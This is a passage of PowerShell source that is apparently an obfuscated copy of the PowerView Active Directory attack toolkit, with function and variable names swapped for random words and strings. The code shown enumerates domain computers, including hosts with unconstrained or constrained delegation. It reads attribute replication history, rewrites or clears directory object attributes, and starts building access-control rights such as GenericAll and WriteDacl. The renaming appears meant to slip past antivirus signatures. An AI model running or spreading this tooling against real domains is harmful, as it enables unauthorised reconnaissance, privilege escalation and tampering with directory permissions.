        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $lIzfKSHR99 = Zimbabweans @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            pharyngeal -preAkVMm99 -yCVbxJse99 $PSBoundParameters
        }
        if ($lIzfKSHR99) {
            $gkqsWVjp99 = ''
            $ypcTqVPU99 = ''
            $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($nwpngcEV99 -match '^S-1-') {
                    $gkqsWVjp99 += "(objectsid=$nwpngcEV99)"
                }
                elseif ($nwpngcEV99 -match '^CN=') {
                    $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[snivel] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                        $cODXoeui99['Domain'] = $WbECQjVp99
                        $lIzfKSHR99 = Zimbabweans @SearcherArguments
                        if (-not $lIzfKSHR99) {
                            Write-Warning "[snivel] Unable to retrieve domain searcher for '$WbECQjVp99'"
                        }
                    }
                }
                elseif ($nwpngcEV99.Contains('.')) {
                    $gkqsWVjp99 += "(|(name=$nwpngcEV99)(dnshostname=$nwpngcEV99))"
                }
                elseif ($nwpngcEV99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $wqHaFAge99 = (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                }
                else {
                    $gkqsWVjp99 += "(name=$nwpngcEV99)"
                }
            }
            if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                $ypcTqVPU99 += "(|$gkqsWVjp99)"
            }
            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[snivel] Searching for computers with for unconstrained delegation'
                $ypcTqVPU99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[snivel] Searching for computers that are trusted to authenticate for other principals'
                $ypcTqVPU99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[snivel] Searching for printers'
                $ypcTqVPU99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[snivel] Searching for computers with SPN: $SPN"
                $ypcTqVPU99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[snivel] Searching for computers with operating system: $MHzuHSVj99"
                $ypcTqVPU99 += "(operatingsystem=$MHzuHSVj99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[snivel] Searching for computers with service pack: $IooYAKOh99"
                $ypcTqVPU99 += "(operatingsystemservicepack=$IooYAKOh99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[snivel] Searching for computers with site name: $AxVRNJsI99"
                $ypcTqVPU99 += "(serverreferencebl=$AxVRNJsI99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[snivel] Using additional LDAP filter: $YcLdsqIq99"
                $ypcTqVPU99 += "$YcLdsqIq99"
            }
            $oTHeDzbF99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $JYRSSqAf99 = $_.Substring(4)
                    $lLaNpQqS99 = [Int]($uxoaxGDG99::$JYRSSqAf99)
                    $ypcTqVPU99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$lLaNpQqS99))"
                }
                else {
                    $lLaNpQqS99 = [Int]($uxoaxGDG99::$_)
                    $ypcTqVPU99 += "(userAccountControl:1.2.840.113556.1.4.803:=$lLaNpQqS99)"
                }
            }
            $lIzfKSHR99.filter = "(&(samAccountType=805306369)$ypcTqVPU99)"
            Write-Verbose "[snivel] snivel filter string: $($lIzfKSHR99.filter)"
            if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $lIzfKSHR99.FindOne() }
            else { $oboKDFwv99 = $lIzfKSHR99.FindAll() }
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -BoyAErDp99 $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $YaYHUvEO99 = $_
                        $YaYHUvEO99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $YaYHUvEO99 = proletarian -pwEfoKvn99 $_.Properties
                        $YaYHUvEO99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $YaYHUvEO99
                }
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[snivel] Error disposing of the Results object: $_"
                }
            }
            $lIzfKSHR99.dispose()
        }
    }
}
function structuring {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $pWDewsuN99 = [Enum]::GetNames($uxoaxGDG99)
        $pWDewsuN99 = $pWDewsuN99 | ForEach-Object {$_; "NOT_$_"}
        pharyngeal -Name UACFilter -WsFzHTtP99 $pWDewsuN99 -Type ([array])
    }
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $dUhxJVtY99 = Zimbabweans @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            pharyngeal -preAkVMm99 -yCVbxJse99 $PSBoundParameters
        }
        if ($dUhxJVtY99) {
            $gkqsWVjp99 = ''
            $ypcTqVPU99 = ''
            $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($nwpngcEV99 -match '^S-1-') {
                    $gkqsWVjp99 += "(objectsid=$nwpngcEV99)"
                }
                elseif ($nwpngcEV99 -match '^(CN|OU|DC)=') {
                    $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[structuring] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                        $cODXoeui99['Domain'] = $WbECQjVp99
                        $dUhxJVtY99 = Zimbabweans @SearcherArguments
                        if (-not $dUhxJVtY99) {
                            Write-Warning "[structuring] Unable to retrieve domain searcher for '$WbECQjVp99'"
                        }
                    }
                }
                elseif ($nwpngcEV99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $wqHaFAge99 = (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                }
                elseif ($nwpngcEV99.Contains('\')) {
                    $MAfzZiLi99 = $nwpngcEV99.Replace('\28', '(').Replace('\29', ')') | loomed -ffAeRAxr99 Canonical
                    if ($MAfzZiLi99) {
                        $pxFMRsGs99 = $MAfzZiLi99.SubString(0, $MAfzZiLi99.IndexOf('/'))
                        $OFBZmnwK99 = $nwpngcEV99.Split('\')[1]
                        $gkqsWVjp99 += "(samAccountName=$OFBZmnwK99)"
                        $cODXoeui99['Domain'] = $pxFMRsGs99
                        Write-Verbose "[structuring] Extracted domain '$pxFMRsGs99' from '$nwpngcEV99'"
                        $dUhxJVtY99 = Zimbabweans @SearcherArguments
                    }
                }
                elseif ($nwpngcEV99.Contains('.')) {
                    $gkqsWVjp99 += "(|(samAccountName=$nwpngcEV99)(name=$nwpngcEV99)(dnshostname=$nwpngcEV99))"
                }
                else {
                    $gkqsWVjp99 += "(|(samAccountName=$nwpngcEV99)(name=$nwpngcEV99)(displayname=$nwpngcEV99))"
                }
            }
            if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                $ypcTqVPU99 += "(|$gkqsWVjp99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[structuring] Using additional LDAP filter: $YcLdsqIq99"
                $ypcTqVPU99 += "$YcLdsqIq99"
            }
            $oTHeDzbF99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $JYRSSqAf99 = $_.Substring(4)
                    $lLaNpQqS99 = [Int]($uxoaxGDG99::$JYRSSqAf99)
                    $ypcTqVPU99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$lLaNpQqS99))"
                }
                else {
                    $lLaNpQqS99 = [Int]($uxoaxGDG99::$_)
                    $ypcTqVPU99 += "(userAccountControl:1.2.840.113556.1.4.803:=$lLaNpQqS99)"
                }
            }
            if ($ypcTqVPU99 -and $ypcTqVPU99 -ne '') {
                $dUhxJVtY99.filter = "(&$ypcTqVPU99)"
            }
            Write-Verbose "[structuring] structuring filter string: $($dUhxJVtY99.filter)"
            if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $dUhxJVtY99.FindOne() }
            else { $oboKDFwv99 = $dUhxJVtY99.FindAll() }
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = proletarian -pwEfoKvn99 $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[structuring] Error disposing of the Results object: $_"
                }
            }
            $dUhxJVtY99.dispose()
        }
    }
}
function Russian {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $cODXoeui99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $cODXoeui99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['FindOne']) { $cODXoeui99['FindOne'] = $JonZpKBd99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['Properties']) {
            $oHGJEtaY99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $oHGJEtaY99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $cODXoeui99['Identity'] = $FMEdvzGY99 }
        structuring @SearcherArguments | ForEach-Object {
            $MSCuKRTY99 = $_.Properties['distinguishedname'][0]
            ForEach($RRMCAMVJ99 in $_.Properties['msds-replattributemetadata']) {
                $HqKntbfR99 = [xml]$RRMCAMVJ99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($HqKntbfR99) {
                    if ($HqKntbfR99.pszAttributeName -Match $oHGJEtaY99) {
                        $MhFNKxWo99 = New-Object PSObject
                        $MhFNKxWo99 | Add-Member NoteProperty 'ObjectDN' $MSCuKRTY99
                        $MhFNKxWo99 | Add-Member NoteProperty 'AttributeName' $HqKntbfR99.pszAttributeName
                        $MhFNKxWo99 | Add-Member NoteProperty 'LastOriginatingChange' $HqKntbfR99.ftimeLastOriginatingChange
                        $MhFNKxWo99 | Add-Member NoteProperty 'Version' $HqKntbfR99.dwVersion
                        $MhFNKxWo99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $HqKntbfR99.pszLastOriginatingDsaDN
                        $MhFNKxWo99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $MhFNKxWo99
                    }
                }
                else {
                    Write-Verbose "[Russian] Error retrieving 'msds-replattributemetadata' for '$MSCuKRTY99'"
                }
            }
        }
    }
}
function grovelled {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $cODXoeui99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $cODXoeui99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['Properties']) {
            $oHGJEtaY99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $oHGJEtaY99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $cODXoeui99['Identity'] = $FMEdvzGY99 }
        structuring @SearcherArguments | ForEach-Object {
            $MSCuKRTY99 = $_.Properties['distinguishedname'][0]
            ForEach($RRMCAMVJ99 in $_.Properties['msds-replvaluemetadata']) {
                $HqKntbfR99 = [xml]$RRMCAMVJ99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($HqKntbfR99) {
                    if ($HqKntbfR99.pszAttributeName -Match $oHGJEtaY99) {
                        $MhFNKxWo99 = New-Object PSObject
                        $MhFNKxWo99 | Add-Member NoteProperty 'ObjectDN' $MSCuKRTY99
                        $MhFNKxWo99 | Add-Member NoteProperty 'AttributeName' $HqKntbfR99.pszAttributeName
                        $MhFNKxWo99 | Add-Member NoteProperty 'AttributeValue' $HqKntbfR99.pszObjectDn
                        $MhFNKxWo99 | Add-Member NoteProperty 'TimeCreated' $HqKntbfR99.ftimeCreated
                        $MhFNKxWo99 | Add-Member NoteProperty 'TimeDeleted' $HqKntbfR99.ftimeDeleted
                        $MhFNKxWo99 | Add-Member NoteProperty 'LastOriginatingChange' $HqKntbfR99.ftimeLastOriginatingChange
                        $MhFNKxWo99 | Add-Member NoteProperty 'Version' $HqKntbfR99.dwVersion
                        $MhFNKxWo99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $HqKntbfR99.pszLastOriginatingDsaDN
                        $MhFNKxWo99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $MhFNKxWo99
                    }
                }
                else {
                    Write-Verbose "[grovelled] Error retrieving 'msds-replvaluemetadata' for '$MSCuKRTY99'"
                }
            }
        }
    }
}
function tonal {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $cODXoeui99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $cODXoeui99['Identity'] = $FMEdvzGY99 }
        $SwhVpDDy99 = structuring @SearcherArguments
        ForEach ($Object in $SwhVpDDy99) {
            $Entry = $SwhVpDDy99.GetDirectoryEntry()
            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[tonal] Setting '$($_.Name)' to '$($_.Value)' for object '$($SwhVpDDy99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[tonal] Error setting/replacing properties for object '$($SwhVpDDy99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $FoBxIIdo99 = $_.Name
                        $uXfXHeut99 = $_.Value
                        Write-Verbose "[tonal] XORing '$FoBxIIdo99' with '$uXfXHeut99' for object '$($SwhVpDDy99.Properties.samaccountname)'"
                        $zkyXgwrs99 = $Entry.$FoBxIIdo99[0].GetType().name
                        $jIammSSZ99 = $($Entry.$FoBxIIdo99) -bxor $uXfXHeut99
                        $Entry.$FoBxIIdo99 = $jIammSSZ99 -as $zkyXgwrs99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[tonal] Error XOR'ing properties for object '$($SwhVpDDy99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $FoBxIIdo99 = $_
                        Write-Verbose "[tonal] Clearing '$FoBxIIdo99' for object '$($SwhVpDDy99.Properties.samaccountname)'"
                        $Entry.$FoBxIIdo99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[tonal] Error clearing properties for object '$($SwhVpDDy99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function christens {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $sqoLQduU99
    )
    Begin {
        if($sqoLQduU99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }
        function waffling {
            Param (
                [int[]]
                $VswLXlVp99
            )
            $VjnUIrBT99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $VswLXlVp99[$i]
                $LIdFeKYN99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
                $VjnUIrBT99[$LIdFeKYN99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $VjnUIrBT99[$LIdFeKYN99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $VjnUIrBT99[$LIdFeKYN99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $VjnUIrBT99[$LIdFeKYN99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $VjnUIrBT99[$LIdFeKYN99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $VjnUIrBT99[$LIdFeKYN99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $VjnUIrBT99[$LIdFeKYN99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $VjnUIrBT99[$LIdFeKYN99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }
            $VjnUIrBT99
        }
    }
    Process {
        $MhFNKxWo99 = @{
            Sunday = waffling -VswLXlVp99 $sqoLQduU99[0..2]
            Monday = waffling -VswLXlVp99 $sqoLQduU99[3..5]
            Tuesday = waffling -VswLXlVp99 $sqoLQduU99[6..8]
            Wednesday = waffling -VswLXlVp99 $sqoLQduU99[9..11]
            Thurs = waffling -VswLXlVp99 $sqoLQduU99[12..14]
            Friday = waffling -VswLXlVp99 $sqoLQduU99[15..17]
            Saturday = waffling -VswLXlVp99 $sqoLQduU99[18..20]
        }
        $MhFNKxWo99 = New-Object PSObject -Property $MhFNKxWo99
        $MhFNKxWo99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $MhFNKxWo99
    }
}
function pantry {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $tOdWYUfv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $hYABGmiT99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $HhNKRiYA99,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $xmKgCvlF99,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $EvGISQEU99,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $ikuxOjdc99,
        [Guid]
        $POxzXcvX99
    )
    Begin {
        if ($tOdWYUfv99 -notmatch '^S-1-.*') {
            $axqedcxq99 = @{
